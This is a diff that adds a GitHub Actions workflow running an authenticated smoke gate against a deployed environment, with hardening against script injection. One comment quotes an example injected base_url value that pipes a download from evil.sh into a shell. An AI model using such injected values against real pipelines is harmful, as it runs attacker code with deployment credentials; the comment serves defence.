@@ -1,0 +1,122 @@
+name: Post-deploy smoke
+
+# OPS-01 — Authenticated post-deploy smoke gate.
+#
+# Runs the manifest in ops/smoke/checks.yaml against a DEPLOYED
+# environment and fails if any critical check fails. It is the gate that
+# turns "the rollout finished" into "the rollout works".
+#
+# Two entrypoints:
+#   * workflow_call — invoked by a deploy pipeline right after a stage
+#     completes, before promotion.
+#   * workflow_dispatch — an operator running it by hand, e.g. after a
+#     manual rollback (see docs/runbooks/degraded-mode-*.md § Verify).
+#
+# CREDENTIALS: never in the repository. The gate reads the environment
+# variable NAMES declared in ops/smoke/checks.yaml and expects the values
+# to come from a GitHub Environment secret. If the credential is absent
+# the gate FAILS rather than silently degrading to an unauthenticated
+# run — a green unauthenticated smoke proves nothing.
+
+on:
+  workflow_call:
+    inputs:
+      environment:
+        description: 'GitHub Environment supplying the smoke credentials'
+        type: string
+        required: true
+      base_url:
+        description: 'API base URL of the deployment under test'
+        type: string
+        required: true
+      web_url:
+        description: 'Web base URL (defaults to base_url for single-origin deploys)'
+        type: string
+        required: false
+        default: ''
+    secrets:
+      SMOKE_FORWARD_AUTH_USER:
+        required: true
+      SMOKE_BEARER_TOKEN:
+        required: false
+    outputs:
+      passed:
+        description: 'true when every critical check passed'
+        value: ${{ jobs.smoke.outputs.passed }}
+
+  workflow_dispatch:
+    inputs:
+      environment:
+        description: 'GitHub Environment supplying the smoke credentials'
+        type: environment
+        required: true
+      base_url:
+        description: 'API base URL of the deployment under test'
+        type: string
+        required: true
+      web_url:
+        description: 'Web base URL (blank = same as base_url)'
+        type: string
+        required: false
+        default: ''
+
+concurrency:
+  group: post-deploy-smoke-${{ inputs.environment }}-${{ inputs.base_url }}
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  smoke:
+    name: Authenticated smoke
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    environment: ${{ inputs.environment }}
+    outputs:
+      passed: ${{ steps.run.outputs.passed }}
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+
+      - uses: actions/setup-go@d35c59abb061a4a6fb18e82ac0862c26744d6ab5 # v5.5.0
+        with:
+          go-version: '1.25'
+
+      # Validate the manifest before pointing it at anything. A
+      # malformed manifest must fail as a configuration error, not as a
+      # confusing runtime failure against a live deployment.
+      - name: Validate smoke manifest
+        run: go run ./cmd/ops-gate -check smoke
+
+      - name: Run authenticated smoke gate
+        id: run
+        env:
+          SMOKE_FORWARD_AUTH_USER: ${{ secrets.SMOKE_FORWARD_AUTH_USER }}
+          SMOKE_BEARER_TOKEN: ${{ secrets.SMOKE_BEARER_TOKEN }}
+          # Untrusted workflow inputs go through the environment, never
+          # into the script text. This step holds deployment credentials,
+          # so a base_url of `"; curl evil.sh | sh; #` would otherwise
+          # execute with them in scope.
+          BASE_URL: ${{ inputs.base_url }}
+          WEB_URL: ${{ inputs.web_url }}
+        run: |
+          set -o pipefail
+          if go run ./cmd/smoke-gate \
+              -manifest ops/smoke/checks.yaml \
+              -base-url "$BASE_URL" \
+              -web-url "$WEB_URL" \
+              -json smoke-report.json \
+              -summary "$GITHUB_STEP_SUMMARY"; then
+            echo "passed=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "passed=false" >> "$GITHUB_OUTPUT"
+            exit 1
+          fi
+
+      - name: Upload smoke report
+        if: always()
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: smoke-report-${{ github.run_number }}
+          path: smoke-report.json
+          if-no-files-found: warn
